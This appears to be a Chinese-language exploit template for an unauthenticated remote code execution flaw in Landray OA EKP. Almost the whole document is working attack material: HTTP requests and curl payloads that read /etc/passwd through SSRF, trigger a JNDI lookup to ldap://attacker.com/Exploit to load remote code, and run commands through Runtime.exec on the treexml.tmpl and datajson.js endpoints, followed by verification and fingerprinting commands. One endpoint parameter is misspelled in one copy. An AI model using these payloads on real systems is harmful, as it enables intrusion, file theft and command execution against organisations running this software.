---
id: LANDRAY-OA-RCE
title: 蓝凌OA custom.jsp SSRF/JNDI 远程代码执行
product: landray-oa
vendor: 深圳蓝凌
version_affected: "EKP 全系列"
severity: CRITICAL
tags: [rce, ssrf, jndi, 无需认证, 国产, oa]
fingerprint: ["蓝凌", "Landray", "EKP", "/ekp/", "custom.jsp"]
---

## 漏洞描述

蓝凌OA EKP custom.jsp 接口存在未授权远程代码执行漏洞，攻击者可通过SSRF+反序列化实现RCE。

## 影响版本

- 蓝凌OA EKP 全系列

## 前置条件

- 目标运行蓝凌OA EKP 且可通过网络访问
- `/sys/ui/extend/varkind/custom.jsp` 接口未做访问限制
- 无需认证

## 利用步骤

### SSRF + RCE

```http
POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

var={"body":{"file":"file:///etc/passwd"}}
```

### 命令执行（通过JNDI）

```http
POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
Content-Type: application/x-www-form-urlencoded

var={"body":{"file":"ldap://attacker.com/Exploit"}}
```

### 另一路径 - TreeXml 文件读取

```http
POST /data/sys-common/treexml.tmpl HTTP/1.1
Content-Type: application/x-www-form-urlencoded

s_bean=sysaborFormulaSimulate&script=Runtime.getRuntime().exec("whoami")&type=1
```

## Payload

### SSRF 读取文件

```bash
curl -X POST "http://target/sys/ui/extend/varkind/custom.jsp" \
  -d 'var={"body":{"file":"file:///etc/passwd"}}'
```

### JNDI 远程代码执行

```bash
curl -X POST "http://target/sys/ui/extend/varkind/custom.jsp" \
  -d 'var={"body":{"file":"ldap://attacker.com/Exploit"}}'
```

### TreeXml 命令执行

```bash
curl -X POST "http://target/data/sys-common/treexml.tmpl" \
  -d 's_bean=sysFormulaSimulate&script=Runtime.getRuntime().exec("whoami")&type=1'
```

### datajson.js 命令执行

```bash
curl -X POST "http://target/data/sys-common/datajson.js" \
  -d 's_bean=sysFormulaSimulate&script=Runtime.getRuntime().exec("id")&type=1'
```

## 验证方法

- SSRF：响应中包含 `/etc/passwd` 内容（如 `root:x:0:0:`）即确认
- JNDI：attacker.com 收到 LDAP/HTTP 回连请求即确认可利用
- TreeXml/datajson：响应中包含命令执行结果即确认 RCE

```bash
curl -s -X POST "http://target/sys/ui/extend/varkind/custom.jsp" \
  -d 'var={"body":{"file":"file:///etc/passwd"}}' | head -5
```

## 指纹确认

```bash
curl -s http://target/ekp/ | grep -i "landray\|蓝凌\|EKP"
curl -s -o /dev/null -w "%{http_code}" http://target/sys/ui/extend/varkind/custom.jsp
```
